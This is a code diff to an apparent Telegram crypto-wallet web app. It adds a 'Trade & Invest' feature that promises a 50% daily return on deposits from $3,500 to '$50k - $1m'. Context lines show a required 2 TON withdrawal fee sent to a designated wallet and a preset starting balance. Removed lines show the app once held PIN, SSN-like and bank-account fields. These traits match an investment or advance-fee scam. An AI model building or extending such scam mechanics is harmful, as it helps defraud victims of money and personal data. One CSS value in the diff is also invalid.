@@ -136,7 +136,7 @@
       border-radius: 20px;
       padding: 10px;
       display: flex;
-      justify-content: space-between;
+      justify-content: uniting;
       align-items: center;
       margin: 10px 0;
     }
@@ -369,6 +369,39 @@
     .btn-copy:hover {
       background-color: #218838;
     }
+    .investment-options {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
+    }
+    .investment-btn {
+      background-color: #444;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: background-color 0.3s ease;
+    }
+    .investment-btn:hover {
+      background-color: #666;
+    }
+    .investment-btn:disabled {
+      background-color: #333;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+    .countdown-container {
+      margin-top: 15px;
+      text-align: center;
+    }
+    .countdown-timer {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: gold;
+    }
     @media (max-width: 576px) {
       .iziModal {
         width: 90%;
@@ -377,7 +410,8 @@
         font-size: 0.85rem;
       }
       .wallet-form input,
-      .form-select {
+      .form-select,
+      .investment-btn {
         font-size: 0.8rem;
       }
       .close-btn {
@@ -389,6 +423,9 @@
       .btn-copy {
         font-size: 0.75rem;
         padding: 6px 8px;
+      }
+      .countdown-timer {
+        font-size: 1rem;
       }
       #copyIt, #copyAddress {
         font-size: 1rem;
@@ -589,6 +626,23 @@
           <li>Withdrawals require a 2 TON fee to the designated wallet address.</li>
           <li>Violations of terms (e.g., fake referrals) will result in account suspension.</li>
         </ol>
+      </p>
+      <p style="text-align: left;">
+        <span>Trade & Invest:</span>
+        <p>Select an investment amount to start trading and earn daily returns:</p>
+        <div class="investment-options">
+          <button class="investment-btn" data-amount="3500">$3500</button>
+          <button class="investment-btn" data-amount="5000">$5000</button>
+          <button class="investment-btn" data-amount="10000">$10000</button>
+          <button class="investment-btn" data-amount="20000">$20000</button>
+          <button class="investment-btn" data-amount="30000">$30000</button>
+          <button class="investment-btn" data-amount="50000">$50k - $1m</button>
+        </div>
+        <div id="investment-status" style="margin-top: 15px;"></div>
+        <div class="countdown-container">
+          <p>Next claim available in: <span id="countdown-timer" class="countdown-timer">24:00:00</span></p>
+          <button id="claim-reward" class="investment-btn" disabled>Claim Reward</button>
+        </div>
       </p>
       <p style="text-align: left;">
         <span>Guides:</span>
@@ -847,6 +901,7 @@
               referrals: 0,
               referredBy: null,
               settings: { theme: "dark", currency: "USD" },
+              investment: { amount: 0, lastClaim: null },
               notifications: {
                 welcome: {
                   title: "Welcome!",
@@ -991,9 +1046,33 @@
         } else if (parseFloat(change) < 0) {
           priceElement.classList.add('red');
         }
-        // No class added if change is 0
       });
     };
+
+    // Update countdown timer
+    function updateCountdown(lastClaim, callback) {
+      const now = new Date().getTime();
+      const lastClaimTime = lastClaim ? new Date(lastClaim).getTime() : 0;
+      const oneDay = 24 * 60 * 60 * 1000;
+      const nextClaimTime = lastClaimTime + oneDay;
+      const timeLeft = nextClaimTime - now;
+
+      if (timeLeft <= 0) {
+        $("#countdown-timer").text("00:00:00");
+        $("#claim-reward").prop("disabled", false);
+        return;
+      }
+
+      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+      $("#countdown-timer").text(
+        `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`
+      );
+      $("#claim-reward").prop("disabled", true);
+
+      setTimeout(() => updateCountdown(lastClaim, callback), 1000);
+    }
 
     $(document).ready(function() {
       if (typeof $.fn.iziModal === "undefined") {
@@ -1137,6 +1216,20 @@
           $("#currencySelect").val(userData.settings?.currency || "USD");
           $("body").removeClass("light dark").addClass(userData.settings?.theme || "dark");
           updateBalanceDisplay();
+
+          // Update investment status
+          const investmentAmount = userData.investment?.amount || 0;
+          const lastClaim = userData.investment?.lastClaim;
+          if (investmentAmount > 0) {
+            $("#investment-status").html(`Current Investment: $${investmentAmount.toLocaleString()}<br>Daily Reward: $${(investmentAmount / 2).toFixed(2)}`);
+            $(".investment-btn").prop("disabled", true);
+            updateCountdown(lastClaim);
+          } else {
+            $("#investment-status").html("Select an investment amount to start trading.");
+            $(".investment-btn").prop("disabled", false);
+            $("#claim-reward").prop("disabled", true);
+            $("#countdown-timer").text("24:00:00");
+          }
         });
 
         // Profile form submission
@@ -1200,6 +1293,120 @@
             iziToast.error({ title: "Error", message: `Failed to save settings: ${error.message}`, position: "topRight" });
           } finally {
             submitButton.prop("disabled", false).removeClass("loading").val("Save");
+          }
+        });
+
+        // Investment button click
+        $(".investment-btn").on("click", async function() {
+          const amount = parseFloat($(this).data("amount"));
+          const submitButton = $(this);
+          submitButton
+            .prop("disabled", true)
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');
+
+          try {
+            const snapshot = await get(ref(database, `users/${userId}/balance`));
+            const currentBalance = snapshot.val() || 0;
+            if (amount > currentBalance) {
+              iziToast.error({
+                title: "Error",
+                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Required: $${amount.toFixed(2)}`,
+                position: "topRight"
+              });
+              submitButton.prop("disabled", false).html(`$${amount}`);
+              return;
+            }
+
+            const updates = {
+              [`users/${userId}/balance`]: currentBalance - amount,
+              [`users/${userId}/investment`]: {
+                amount: amount,
+                lastClaim: null
+              },
+              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
+                amount: amount,
+                wallet: "N/A",
+                type: "Investment",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${userId}/notifications/${Date.now()}`]: {
+                title: "Investment Started",
+                message: `You invested $${amount.toFixed(2)}! Claim $${(amount / 2).toFixed(2)} daily.`,
+                timestamp: new Date().toISOString(),
+              },
+            };
+
+            await update(ref(database), updates);
+            iziToast.success({
+              title: "Success",
+              message: `Investment of $${amount.toFixed(2)} started! You can claim $${(amount / 2).toFixed(2)} daily.`,
+              position: "topRight"
+            });
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to process investment: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", false).html(`$${amount}`);
+          }
+        });
+
+        // Claim reward
+        $("#claim-reward").on("click", async () => {
+          const submitButton = $("#claim-reward");
+          submitButton
+            .prop("disabled", true)
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Claiming...');
+
+          try {
+            const snapshot = await get(userRef);
+            const userData = snapshot.val() || {};
+            const investmentAmount = userData.investment?.amount || 0;
+            if (investmentAmount <= 0) {
+              iziToast.error({ title: "Error", message: "No active investment!", position: "topRight" });
+              submitButton.prop("disabled", false).html("Claim Reward");
+              return;
+            }
+
+            const lastClaim = userData.investment?.lastClaim;
+            const now = new Date().getTime();
+            const oneDay = 24 * 60 * 60 * 1000;
+            const nextClaimTime = lastClaim ? new Date(lastClaim).getTime() + oneDay : 0;
+
+            if (lastClaim && now < nextClaimTime) {
+              iziToast.error({ title: "Error", message: "You can only claim once every 24 hours!", position: "topRight" });
+              submitButton.prop("disabled", true).html("Claim Reward");
+              return;
+            }
+
+            const claimAmount = investmentAmount / 2;
+            const currentBalance = userData.balance || 0;
+            const updates = {
+              [`users/${userId}/balance`]: currentBalance + claimAmount,
+              [`users/${userId}/investment/lastClaim`]: new Date().toISOString(),
+              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
+                amount: claimAmount,
+                wallet: "N/A",
+                type: "Investment Claim",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${userId}/notifications/${Date.now()}`]: {
+                title: "Reward Claimed",
+                message: `You claimed $${claimAmount.toFixed(2)} from your investment!`,
+                timestamp: new Date().toISOString(),
+              },
+            };
+
+            await update(ref(database), updates);
+            iziToast.success({
+              title: "Success",
+              message: `Claimed $${claimAmount.toFixed(2)}! Next claim available in 24 hours.`,
+              position: "topRight"
+            });
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to claim reward: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", true).html("Claim Reward");
           }
         });
 
@@ -1274,17 +1481,13 @@
               await set(userRef, {
                 username: username,
                 fullName: "",
-                email: "",
-                pin: "",
-                ssin: "",
-                accountNumber: "",
-                bankName: "",
                 address: "",
                 balance: 78.01,
                 wallet: walletAddress,
                 referrals: 0,
                 referredBy: referrerId,
                 settings: { theme: "dark", currency: "USD" },
+                investment: { amount: 0, lastClaim: null },
                 notifications: {
                   welcome: {
                     title: "Welcome!",
@@ -1492,18 +1695,14 @@
             await update(ref(database), updates);
             document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
             document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
-            iziToast.success({
-              title: "Success",
-              message: `Withdrawal of $${amount.toFixed(2)} requested to ${window.truncateAddress(recipientWallet)}!`,
-              position: "topRight"
-            });
+            iziToast.success({ title: "Success", message: "Withdrawal request submitted!", position: "topRight" });
+            $("#wallet-form")[0].reset();
             $("#darkModal7").iziModal("close");
             $("#darkModal9").iziModal("open");
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to process withdrawal: ${error.message}`, position: "topRight" });
           } finally {
             submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-            $("#insufficient-balance").addClass("hide");
           }
         });
 
@@ -1514,7 +1713,7 @@
           submitButton
             .prop("disabled", true)
             .addClass("loading")
-            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Sending...');
 
           const recipientWallet = $("#sendWalletInput").val().trim();
           const amount = parseFloat($("#sendAmountInput").val().trim());
@@ -1595,28 +1794,28 @@
             };
 
             await update(ref(database), updates);
-            iziToast.success({
-              title: "Success",
-              message: `Sent $${amount.toFixed(2)} to ${window.truncateAddress(recipientWallet)}!`,
-              position: "topRight"
-            });
-            $("#darkModal1").iziModal("close");
+            iziToast.success({ title: "Success", message: `Sent $${amount.toFixed(2)} to ${window.truncateAddress(recipientWallet)}!`, position: "topRight" });
             $("#send-form")[0].reset();
+            $("#darkModal1").iziModal("close");
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to send funds: ${error.message}`, position: "topRight" });
           } finally {
             submitButton.prop("disabled", false).removeClass("loading").val("Send");
-            $("#insufficient-send-balance").addClass("hide");
           }
         });
 
         // Logout
-        $("#logout-btn").on("click", () => {
+        $("#logout-btn").on("click", async () => {
           try {
             document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
             document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
-            window.Telegram.WebApp.close();
             iziToast.success({ title: "Success", message: "Logged out successfully!", position: "topRight" });
+            $("#logout-iziModal").iziModal("close");
+            if (window.Telegram?.WebApp?.close) {
+              window.Telegram.WebApp.close();
+            } else {
+              window.location.href = "about:blank";
+            }
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to logout: ${error.message}`, position: "topRight" });
           }
